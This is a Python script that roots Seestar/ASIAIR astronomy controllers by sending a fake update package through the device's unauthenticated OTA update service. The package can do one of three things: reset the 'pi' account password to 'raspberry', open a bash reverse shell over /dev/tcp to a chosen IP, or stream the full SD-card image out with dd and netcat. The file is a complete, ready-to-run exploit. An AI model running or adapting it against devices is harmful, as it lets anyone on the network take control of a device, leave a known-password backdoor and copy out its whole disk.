# Seestar/ASIAIR jailbreak by @joshumax
# Licensed in the public domain
# Mod by Oxofrimbl to handle differnt ports and added a backup and reverse shell option without modifying the ASIAIR

import socket
import os
import hashlib
import sys
import tempfile
import tarfile
import argparse
import socket


JAILBREAK_FILE = 'jailbreak.tar.bz2'

JAILBREAK_SCRIPT = """
sudo mount -o remount,rw /

echo "pi:raspberry" | sudo chpasswd
sync

sudo mount -o remount,ro /
"""

def recv_all(sock):
    text = ''

    while True:
        chunk = sock.recv(1024)
        text += chunk.decode()

        if not chunk or chunk.decode().endswith('\n'):
            break

    return text


def begin_update(address, file):
    s = socket.socket()
    s_ota = socket.socket()

    file_contents = open(file,'rb').read()
    json_str = '{{"id":1,"method":"begin_recv","params":[{{"file_len":{file_len},"file_name":"air","run_update":true,"md5":"{md5}"}}]}}\r\n'
    fsize = os.path.getsize(file)
    fmd5 = hashlib.md5(file_contents).hexdigest()
    json_str = json_str.format(file_len = fsize, md5 = fmd5)

    # Connect to OTA file socket first
    try:
        print("Try to connect to binary port  4361 (legacy?)")
        s_ota.connect((address, 4361))
    except ConnectionRefusedError:
        try:
            print("Connection to 4361 failed, try to connect to binary port 4360 (new?)")
            s_ota.connect((address, 4360))
        except ConnectionRefusedError:
            print("Cannot connect to binary port")
            sys.exit(-2)

    # Then connect to OTA command socket
    s.connect((address, 4350))

    print('Got: ' + recv_all(s))

    print('Sending RPC: {rpc}'.format(rpc = json_str))
    s.sendall(json_str.encode())

    print('Got back: ' + recv_all(s))

    s_ota.sendall(file_contents)

    s_ota.close()
    s.close()


def create_patch(script_content=""):
    with tempfile.NamedTemporaryFile (mode='w+b',delete=False) as tf:
        #Create reverse shell to client
        tf.write(b'#!/bin/bash\n')
        tf.write(bytes(script_content,'UTF-8'))
        tf.close()
        #Create Fake update Package
        with tarfile.open(JAILBREAK_FILE, "w:bz2") as tarhandle:
            tarhandle.add(tf.name, "update_package.sh")

if __name__ == '__main__':
    create_patch()
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', required=True, help="Set the asiair ip")
    hostname = socket.gethostname()
    client_ip_adress  = socket.gethostbyname(hostname)

    parser.add_argument('--client-ip', help="Client IP in case this client dosnt serve as 'master'", default=client_ip_adress)
    parser.add_argument('--shell', help="Enter IP for reverse-shell connection 'nc -l 4242'",action=argparse.BooleanOptionalAction)
    parser.add_argument('--backup', help="Enter IP for full system backup, client: 'nc -l 4444 | dd of=asiair.img'",action=argparse.BooleanOptionalAction)
    parser.add_argument('--jailbreak', help="PErform a Jailbreak by setting username:password for ssh to pi:raspberry",action=argparse.BooleanOptionalAction)
    args = parser.parse_args()
    client_ip_adress = args.client_ip

    if(not (args.jailbreak or args.backup  or args.shell)):
       print("Please use -h either, perform a jailbreak (rooting device), backup for a TCP port of the full image, or get a reverse shell to a target ip")
       sys.exit(-1)

    if(args.shell):
        create_patch(f"bash -i >& /dev/tcp/{client_ip_adress}/4242 0>&1")
        begin_update(args.ip, JAILBREAK_FILE)
    
    if(args.backup):
        create_patch(f"sudo dd if=/dev/mmcblk0 bs=1M | nc {client_ip_adress} 4444")
        begin_update(args.ip, JAILBREAK_FILE)
    
    if(args.jailbreak):
        create_patch(JAILBREAK_SCRIPT)
        begin_update(args.ip, JAILBREAK_FILE)
